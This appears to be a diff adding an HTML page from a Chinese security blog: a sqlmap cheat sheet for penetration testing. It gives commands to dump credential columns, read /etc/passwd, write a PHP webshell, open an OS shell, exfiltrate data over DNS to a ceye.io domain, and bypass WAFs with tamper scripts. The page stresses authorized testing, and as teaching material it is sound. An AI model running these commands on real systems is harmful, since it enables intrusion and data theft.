@@ -1,0 +1,561 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <link rel="stylesheet" href="/css/custom.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>sqlmap 使用速查与进阶技巧</title>
+    <meta charset="utf-8">
+    <meta name="description" content="Ladder@sqlmap 使用速查与进阶技巧 - Hzhsrc home">
+    <meta name="author" content="hzhsec">
+    <link rel="canonical" href="http://118.178.86.67/list/base_bug/sql%E6%B3%A8%E5%85%A5/sqlmap/">
+
+    <link rel="alternate" type="application/rss+xml" href="http://118.178.86.67//index.xml" title="Hzhsrc home">
+
+    
+
+
+    <meta property="og:title" content="sqlmap 使用速查与进阶技巧" />
+<meta property="og:description" content="" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://118.178.86.67/list/base_bug/sql%E6%B3%A8%E5%85%A5/sqlmap/" /><meta property="article:section" content="list" />
+<meta property="article:published_time" content="2024-04-25T15:40:00+08:00" />
+<meta property="article:modified_time" content="2024-04-25T15:40:00+08:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="sqlmap 使用速查与进阶技巧"/>
+<meta name="twitter:description" content=""/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "目录",
+      "item": "http://118.178.86.67/list/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "基础漏洞",
+      "item": "http://118.178.86.67/list/base_bug/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  4 ,
+      "name": "sqlmap 使用速查与进阶技巧",
+      "item": "http://118.178.86.67/list/base_bug/sql%E6%B3%A8%E5%85%A5/sqlmap/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "sqlmap 使用速查与进阶技巧",
+  "name": "sqlmap 使用速查与进阶技巧",
+  "description": "",
+  "keywords": [
+    "sqlmap", "渗透测试", "OOB", "tamper"
+  ],
+  "articleBody": "sqlmap 使用速查与进阶技巧 本文分为：基础枚举 / 权限与文件 / 命令交互与 Shell / 请求写法（POST/JSON/HEAD/Cookie/文件上传）/ 绕过与 Tamper / 代理与调试 / 带外（DNSLOG）/ 常见示例。\n一、基础枚举（快速命令） 目标：确认注入、列出库表列、导出数据\n指定目标参数（最常见） sqlmap -u \"http://vuln/?id=1\" -p id 当前数据库 sqlmap -u \"http://vuln/?id=1\" --current-db 列出数据库 sqlmap -u \"http://vuln/?id=1\" --dbs 列出指定库的表 sqlmap -u \"http://vuln/?id=1\" -D target_db --tables # 或 sqlmap -u \"http://vuln/?id=1\" --tables -D target_db 列出表的列 sqlmap -u \"http://vuln/?id=1\" -D target_db -T target_table --columns 导出（dump）指定列或整表 # 导出表中所有列 sqlmap -u \"http://vuln/?id=1\" -D target_db -T target_table --dump # 只导出特定列 sqlmap -u \"http://vuln/?id=1\" -D target_db -T target_table -C \"username,password\" --dump 二、权限枚举与文件操作 目标：判断权限、读取/写入文件\n判断是否为 DBA（高权限） sqlmap -u \"http://vuln/?id=1\" --is-dba 查看权限细节 sqlmap -u \"http://vuln/?id=1\" --privileges 从服务器读取文件（file-read） sqlmap -u \"http://vuln/?id=1\" --file-read=\"/etc/passwd\" # Windows 示例 sqlmap -u \"http://vuln/?id=1\" --file-read=\"C:\\\\\\\\Windows\\\\\\\\win.ini\" 写文件到服务器（file-write） 需要 FILE 权限，并受 secure-file-priv 限制 sqlmap -u \"http://vuln/?id=1\" --file-write=\"/tmp/shell.php\" --file-dest=\"/var/www/html/shell.php\" 写入后访问 http://target/shell.php （注意风险与合法性）\n三、交互式命令与 Shell 交互式 SQL shell sqlmap -u \"http://vuln/?id=1\" --sql-shell 执行单条系统命令（os-cmd） sqlmap -u \"http://vuln/?id=1\" --os-cmd \"whoami\" 交互式系统 shell（如果支持） sqlmap -u \"http://vuln/?id=1\" --os-shell 注意：os-shell/os-cmd 需目标具备相应的提权或数据库扩展能力（例如写入 Webshell、调用 xp_cmdshell（MSSQL），或利用 UDF 等）。\n四、提交方法：POST / JSON / HEAD / Cookie / 文件上传 POST 数据（普通表单） sqlmap -u \"http://vuln/login.php\" --data=\"username=admin\u0026password=123\" -p username 从请求文件读取（抓包导入） sqlmap -r req.txt -p username 设置 Cookie sqlmap -u \"http://vuln/?id=1\" --cookie=\"PHPSESSID=xxx; uid=1\" 自定义请求头（比如 JSON） sqlmap -u \"http://vuln/api/search\" --data='{\"q\":\"test\"}' --headers=\"Content-Type: application/json\" -p q 上传文件点测试（模拟 multipart/form-data） 通常把抓包的 POST 全部放入 req.txt，然后： sqlmap -r req.txt -p upload 指定参数名（-p） sqlmap -u \"http://vuln/?id=1\u0026name=foo\" -p \"name\" CSRF token 支持（若页面需要） sqlmap -u \"http://vuln/\" --data=\"token=abc\u0026id=1\" --csrf-token=token 五、带外 / DNSLOG（OOB）实战 当没有回显且盲注/延时不可用时，使用 DNS/OUT-OF-BAND 渠道（Sqlmap 支持 DNS 外联回显）\n使用 DNSLOG（先在平台获取域名，如 abc.xxx.ceye.io），然后： sqlmap -u \"http://vuln/?id=1\" --dns-domain=\"abc.xxx.ceye.io\" --threads=1 或者结合读取函数生成外联（如 LOAD_FILE 触发 UNC），sqlmap 会尝试把数据通过 DNS 请求回传到你的域名。 OOB 检测在某些环境中生效更好（尤其是 Windows SMB/UNC 能触发远程日志时）。 六、绕过与 Tamper 脚本 常见用途：绕过 WAF、大小写过滤、关键词过滤、编码过滤等。 调用已有 tamper 脚本： sqlmap -u \"http://vuln/?id=1\" --tamper=space2comment,between 将 payload 自动 base64（示例） sqlmap -u \"http://vuln/?id=1\" --tamper=base64encode 自定义 tamper（示例 skeleton） # example tamper 脚本：tamper/mytamper.py from lib.core.enums import PRIORITY __priority__ = PRIORITY.LOW def dependencies(): pass def tamper(payload, **kwargs): if payload: payload = payload.replace('SELECT','SeLeCt') payload = payload.replace('OR','Or') return payload 把脚本放到 sqlmap 的 tamper/ 目录，使用 --tamper=mytamper。\n实战建议：先用 --tamper 少量组合测试，避免产生太多噪音且降低误报率。\n七、代理 / 指纹 / 调试参数 代理（抓包或走折返） sqlmap -u \"http://vuln/?id=1\" --proxy=\"http://127.0.0.1:8080\" 详细等级（verbosity） -v 3 # 0-6，数值越大信息越详细 随机 UA 或自定义 UA --random-agent --user-agent=\"Mozilla/5.0 (X11; Linux x86_64)...\" 调整延时、超时与线程 --time-sec=3 # 延时时间（用于 time-based） --timeout=15 # 请求超时 --threads=5 # 并发线程数（提高速度，注意不要过载目标） 测试等级与风险（更多扫描） --level=3 # 1-5，数字越高 sqlmap 尝试的 payload 与测试点越多 --risk=2 # 0-3，risk 越高会尝试更具破坏性/风险的 payload（如写操作） 八、技术类型（–technique / -T） 指定注入类型优先顺序（加快定位）：\nB = Boolean-based blind E = Error-based U = UNION query S = Stacked queries T = Time-based blind 示例：只测试布尔与报错型\nsqlmap -u \"http://vuln/?id=1\" --technique=BE 九、避免噪音与自动化选项 批处理模式（不交互） --batch 跳过系统数据库 --exclude-sysdbs 跳过特定库/表 --skip=db1,db2 十、常见实战示例 基本枚举并导出 admin 表： sqlmap -u \"http://vuln/?id=1\" -p id --dbs sqlmap -u \"http://vuln/?id=1\" -p id -D mydb --tables sqlmap -u \"http://vuln/?id=1\" -p id -D mydb -T admin --columns sqlmap -u \"http://vuln/?id=1\" -p id -D mydb -T admin -C \"username,password\" --dump JSON POST 注入（指定 header） sqlmap -u \"http://vuln/api\" --data='{\"q\":\"test\"}' -p q --headers=\"Content-Type: application/json\" 用抓包文件（包含 multipart 上传）测试 sqlmap -r req.txt --level=5 --risk=3 使用 DNSLOG 做带外回显 sqlmap -u \"http://vuln/?id=1\" --dns-domain=\"yourid.ceye.io\" --batch 加强检测、并配合 tamper 绕过（示例） sqlmap -u \"http://vuln/?id=1\" --data=\"id=1\" -p id --level=5 --risk=3 --tamper=between,randomcase --batch 十一、安全与合规提示 仅在授权范围内测试（公司内网、CTF、靶场、你有书面授权的目标）； --file-write、--os-shell、--os-cmd 将产生高破坏风险，谨慎使用； 导出与写文件可能触发入侵检测（IDS/IPS）或破坏系统稳定性，提前告知被授权方并获取允许； 对渗透结果做好记录，避免在未授权环境造成数据泄露或法律问题。 十二、延伸学习 阅读 sqlmap 官方文档与 tamper 脚本源码来理解 payload 如何被修改； 在靶场（DVWA、Mutillidae、vulnweb、OWASP Juice Shop）练习不同参数组合与 tamper； 学会在 Burp 中修改与重放请求，再将抓包保存为 req.txt 用 -r 调用 sqlmap。 ",
+  "wordCount" : "491",
+  "inLanguage": "en",
+  "datePublished": "2024-04-25T15:40:00+08:00",
+  "dateModified": "2024-04-25T15:40:00+08:00",
+  "author":{
+    "@type": "Person",
+    "name": "hzhsec"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://118.178.86.67/list/base_bug/sql%E6%B3%A8%E5%85%A5/sqlmap/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Hzhsrc home",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://118.178.86.67/favicon.ico"
+    }
+  }
+}
+</script>
+    <link rel="icon" href="/images/hzhsec.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/hzhsec.png">
+
+<link rel="manifest" href="/images/hzhsec.png">
+    
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lxgw-wenkai-webfont@1.7.0/style.css" />
+
+    
+    
+    <link rel="stylesheet" href="/css/main.min.ec28f09e946fc0df77c187fcd0d0ebde58fca6de8efb8e1620f3d45c32d4da88.css" integrity="sha256-7CjwnpRvwN93wYf80NDr3lj8pt6O&#43;44WIPPUXDLU2og=" crossorigin="anonymous" media="screen" />
+
+    
+    <link rel="stylesheet" href="/scss/highlight/github-dark.min.min.66034289ee9a113219a2c4aae0a8bd2095ab255c832a42efcf5863f10814e7a1.css" />
+
+    
+    <script src="/js/highlight.min.min.c098d85b5396dec4707ea2cead1445b4dc2ff0fc56b8dbbd9049d0d1c50ad237.js"></script>
+    <script>hljs.highlightAll();</script>
+
+    <script>(()=>{var t=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches,e=localStorage.getItem("theme");t&&e===null&&(localStorage.setItem("theme","dark"),document.documentElement.setAttribute("data-dark-mode","")),t&&e==="dark"&&document.documentElement.setAttribute("data-dark-mode",""),e==="dark"&&document.documentElement.setAttribute("data-dark-mode","")})()</script>
+    </head>
+<body>
+      <main class="wrapper"><nav class="navigation">
+    <section class="container">
+        <a class="navigation-brand" href="/">
+            主页
+        </a>
+        <input type="checkbox" id="menu-toggle" />
+        <label class="menu-button float-right" for="menu-toggle">
+            <span></span><span></span><span></span>
+        </label>
+        
+        <ul class="navigation-list" id="navigation-list">
+            
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/list/">目录</a>
+            </li>
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/archives/">归档</a>
+            </li>
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/message/">关于</a>
+            </li>
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/categories/">分类</a>
+            </li>
+            
+            
+
+            <li class="navigation-item menu-separator">
+                <span>|</span>
+            </li>
+
+            
+            
+            <li class="navigation-item navigation-social">
+                <a class="navigation-link" href="https://github.com/hzhsec">    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+         stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-github">
+      <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+    </svg>
+    </a>
+            </li>
+            
+            <li class="navigation-item navigation-social">
+                <a class="navigation-link" href="/message/">    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+         stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-mail">
+      <path d="M4 4h16v16H4z"></path><polyline points="4,4 12,12 20,4"></polyline>
+    </svg>
+    </a>
+            </li>
+            
+            
+
+            <li class="navigation-item navigation-dark">
+                <button id="mode" type="button" aria-label="toggle user light or dark theme">
+                    <span class="toggle-dark">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                             stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-moon">
+                            <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                        </svg>
+                    </span>
+                    <span class="toggle-light">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                             stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-sun">
+                            <circle cx="12" cy="12" r="5"></circle>
+                            <line x1="12" y1="1" x2="12" y2="3"></line>
+                            <line x1="12" y1="21" x2="12" y2="23"></line>
+                            <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                            <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                            <line x1="1" y1="12" x2="3" y2="12"></line>
+                            <line x1="21" y1="12" x2="23" y2="12"></line>
+                            <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                            <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                        </svg>
+                    </span>
+                </button>
+            </li>
+            
+        </ul>
+        
+    </section>
+</nav>
+
+<div id="content">
+<article class="blog-single">
+  <header class="blog-title">
+    <h1>sqlmap 使用速查与进阶技巧</h1>
+  </header>
+
+  <p>
+  <small>
+    April 25, 2024&nbsp;· 491 words&nbsp;· 3 min</small>
+
+  
+<p>
+
+  <div class="blog-toc">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#一基础枚举快速命令">一、基础枚举（快速命令）</a></li>
+    <li><a href="#二权限枚举与文件操作">二、权限枚举与文件操作</a></li>
+    <li><a href="#三交互式命令与-shell">三、交互式命令与 Shell</a></li>
+    <li><a href="#四提交方法post--json--head--cookie--文件上传">四、提交方法：POST / JSON / HEAD / Cookie / 文件上传</a></li>
+    <li><a href="#五带外--dnslogoob实战">五、带外 / DNSLOG（OOB）实战</a></li>
+    <li><a href="#六绕过与-tamper-脚本">六、绕过与 Tamper 脚本</a></li>
+    <li><a href="#七代理--指纹--调试参数">七、代理 / 指纹 / 调试参数</a></li>
+    <li><a href="#八技术类型--technique---t">八、技术类型（&ndash;technique / -T）</a></li>
+    <li><a href="#九避免噪音与自动化选项">九、避免噪音与自动化选项</a></li>
+    <li><a href="#十常见实战示例">十、常见实战示例</a></li>
+    <li><a href="#十一安全与合规提示">十一、安全与合规提示</a></li>
+    <li><a href="#十二延伸学习">十二、延伸学习</a></li>
+  </ul>
+</nav>
+  </div>
+
+  <section class="blog-content"><h1 id="sqlmap-使用速查与进阶技巧">sqlmap 使用速查与进阶技巧</h1>
+<p>本文分为：基础枚举 / 权限与文件 / 命令交互与 Shell / 请求写法（POST/JSON/HEAD/Cookie/文件上传）/ 绕过与 Tamper / 代理与调试 / 带外（DNSLOG）/ 常见示例。</p>
+<hr>
+<h2 id="一基础枚举快速命令">一、基础枚举（快速命令）</h2>
+<blockquote>
+<p>目标：确认注入、列出库表列、导出数据</p>
+</blockquote>
+<ul>
+<li>指定目标参数（最常见）</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -u <span style="color:#e6db74">&#34;http://vuln/?id=1&#34;</span> -p id
+</span></span></code></pre></div><ul>
+<li>当前数据库</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -u <span style="color:#e6db74">&#34;http://vuln/?id=1&#34;</span> --current-db
+</span></span></code></pre></div><ul>
+<li>列出数据库</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -u <span style="color:#e6db74">&#34;http://vuln/?id=1&#34;</span> --dbs
+</span></span></code></pre></div><ul>
+<li>列出指定库的表</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -u <span style="color:#e6db74">&#34;http://vuln/?id=1&#34;</span> -D target_db --tables
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 或</span>
+</span></span><span style="display:flex;"><span>sqlmap -u <span style="color:#e6db74">&#34;http://vuln/?id=1&#34;</span> --tables -D target_db
+</span></span></code></pre></div><ul>
+<li>列出表的列</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -u <span style="color:#e6db74">&#34;http://vuln/?id=1&#34;</span> -D target_db -T target_table --columns
+</span></span></code></pre></div><ul>
+<li>导出（dump）指定列或整表</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># 导出表中所有列</span>
+</span></span><span style="display:flex;"><span>sqlmap -u <span style="color:#e6db74">&#34;http://vuln/?id=1&#34;</span> -D target_db -T target_table --dump
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 只导出特定列</span>
+</span></span><span style="display:flex;"><span>sqlmap -u <span style="color:#e6db74">&#34;http://vuln/?id=1&#34;</span> -D target_db -T target_table -C <span style="color:#e6db74">&#34;username,password&#34;</span> --dump
+</span></span></code></pre></div><hr>
+<h2 id="二权限枚举与文件操作">二、权限枚举与文件操作</h2>
+<blockquote>
+<p>目标：判断权限、读取/写入文件</p>
+</blockquote>
+<ul>
+<li>判断是否为 DBA（高权限）</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -u <span style="color:#e6db74">&#34;http://vuln/?id=1&#34;</span> --is-dba
+</span></span></code></pre></div><ul>
+<li>查看权限细节</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -u <span style="color:#e6db74">&#34;http://vuln/?id=1&#34;</span> --privileges
+</span></span></code></pre></div><ul>
+<li>从服务器读取文件（file-read）</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -u <span style="color:#e6db74">&#34;http://vuln/?id=1&#34;</span> --file-read<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/etc/passwd&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Windows 示例</span>
+</span></span><span style="display:flex;"><span>sqlmap -u <span style="color:#e6db74">&#34;http://vuln/?id=1&#34;</span> --file-read<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;C:\\\\Windows\\\\win.ini&#34;</span>
+</span></span></code></pre></div><ul>
+<li>写文件到服务器（file-write）
+需要 FILE 权限，并受 <code>secure-file-priv</code> 限制</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -u <span style="color:#e6db74">&#34;http://vuln/?id=1&#34;</span> --file-write<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/tmp/shell.php&#34;</span> --file-dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/var/www/html/shell.php&#34;</span>
+</span></span></code></pre></div><blockquote>
+<p>写入后访问 <code>http://target/shell.php</code> （注意风险与合法性）</p>
+</blockquote>
+<hr>
+<h2 id="三交互式命令与-shell">三、交互式命令与 Shell</h2>
+<ul>
+<li>交互式 SQL shell</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -u <span style="color:#e6db74">&#34;http://vuln/?id=1&#34;</span> --sql-shell
+</span></span></code></pre></div><ul>
+<li>执行单条系统命令（os-cmd）</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -u <span style="color:#e6db74">&#34;http://vuln/?id=1&#34;</span> --os-cmd <span style="color:#e6db74">&#34;whoami&#34;</span>
+</span></span></code></pre></div><ul>
+<li>交互式系统 shell（如果支持）</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -u <span style="color:#e6db74">&#34;http://vuln/?id=1&#34;</span> --os-shell
+</span></span></code></pre></div><blockquote>
+<p>注意：os-shell/os-cmd 需目标具备相应的提权或数据库扩展能力（例如写入 Webshell、调用 xp_cmdshell（MSSQL），或利用 UDF 等）。</p>
+</blockquote>
+<hr>
+<h2 id="四提交方法post--json--head--cookie--文件上传">四、提交方法：POST / JSON / HEAD / Cookie / 文件上传</h2>
+<ul>
+<li>POST 数据（普通表单）</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -u <span style="color:#e6db74">&#34;http://vuln/login.php&#34;</span> --data<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;username=admin&amp;password=123&#34;</span> -p username
+</span></span></code></pre></div><ul>
+<li>从请求文件读取（抓包导入）</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -r req.txt -p username
+</span></span></code></pre></div><ul>
+<li>设置 Cookie</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -u <span style="color:#e6db74">&#34;http://vuln/?id=1&#34;</span> --cookie<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;PHPSESSID=xxx; uid=1&#34;</span>
+</span></span></code></pre></div><ul>
+<li>自定义请求头（比如 JSON）</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -u <span style="color:#e6db74">&#34;http://vuln/api/search&#34;</span> --data<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;{&#34;q&#34;:&#34;test&#34;}&#39;</span> --headers<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> -p q
+</span></span></code></pre></div><ul>
+<li>上传文件点测试（模拟 multipart/form-data）
+通常把抓包的 POST 全部放入 <code>req.txt</code>，然后：</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -r req.txt -p upload
+</span></span></code></pre></div><ul>
+<li>指定参数名（-p）</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -u <span style="color:#e6db74">&#34;http://vuln/?id=1&amp;name=foo&#34;</span> -p <span style="color:#e6db74">&#34;name&#34;</span>
+</span></span></code></pre></div><ul>
+<li>CSRF token 支持（若页面需要）</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -u <span style="color:#e6db74">&#34;http://vuln/&#34;</span> --data<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;token=abc&amp;id=1&#34;</span> --csrf-token<span style="color:#f92672">=</span>token
+</span></span></code></pre></div><hr>
+<h2 id="五带外--dnslogoob实战">五、带外 / DNSLOG（OOB）实战</h2>
+<blockquote>
+<p>当没有回显且盲注/延时不可用时，使用 DNS/OUT-OF-BAND 渠道（Sqlmap 支持 DNS 外联回显）</p>
+</blockquote>
+<ul>
+<li>使用 DNSLOG（先在平台获取域名，如 <code>abc.xxx.ceye.io</code>），然后：</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -u <span style="color:#e6db74">&#34;http://vuln/?id=1&#34;</span> --dns-domain<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;abc.xxx.ceye.io&#34;</span> --threads<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><ul>
+<li>或者结合读取函数生成外联（如 LOAD_FILE 触发 UNC），sqlmap 会尝试把数据通过 DNS 请求回传到你的域名。</li>
+<li>OOB 检测在某些环境中生效更好（尤其是 Windows SMB/UNC 能触发远程日志时）。</li>
+</ul>
+<hr>
+<h2 id="六绕过与-tamper-脚本">六、绕过与 Tamper 脚本</h2>
+<ul>
+<li>常见用途：绕过 WAF、大小写过滤、关键词过滤、编码过滤等。</li>
+<li>调用已有 tamper 脚本：</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -u <span style="color:#e6db74">&#34;http://vuln/?id=1&#34;</span> --tamper<span style="color:#f92672">=</span>space2comment,between
+</span></span></code></pre></div><ul>
+<li>将 payload 自动 base64（示例）</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -u <span style="color:#e6db74">&#34;http://vuln/?id=1&#34;</span> --tamper<span style="color:#f92672">=</span>base64encode
+</span></span></code></pre></div><ul>
+<li>自定义 tamper（示例 skeleton）</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># example tamper 脚本：tamper/mytamper.py</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> lib.core.enums <span style="color:#f92672">import</span> PRIORITY
+</span></span><span style="display:flex;"><span>__priority__ <span style="color:#f92672">=</span> PRIORITY<span style="color:#f92672">.</span>LOW
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">dependencies</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">pass</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">tamper</span>(payload, <span style="color:#f92672">**</span>kwargs):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> payload:
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> payload<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;SELECT&#39;</span>,<span style="color:#e6db74">&#39;SeLeCt&#39;</span>)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> payload<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;OR&#39;</span>,<span style="color:#e6db74">&#39;Or&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> payload
+</span></span></code></pre></div><p>把脚本放到 sqlmap 的 <code>tamper/</code> 目录，使用 <code>--tamper=mytamper</code>。</p>
+<p><strong>实战建议</strong>：先用 <code>--tamper</code> 少量组合测试，避免产生太多噪音且降低误报率。</p>
+<hr>
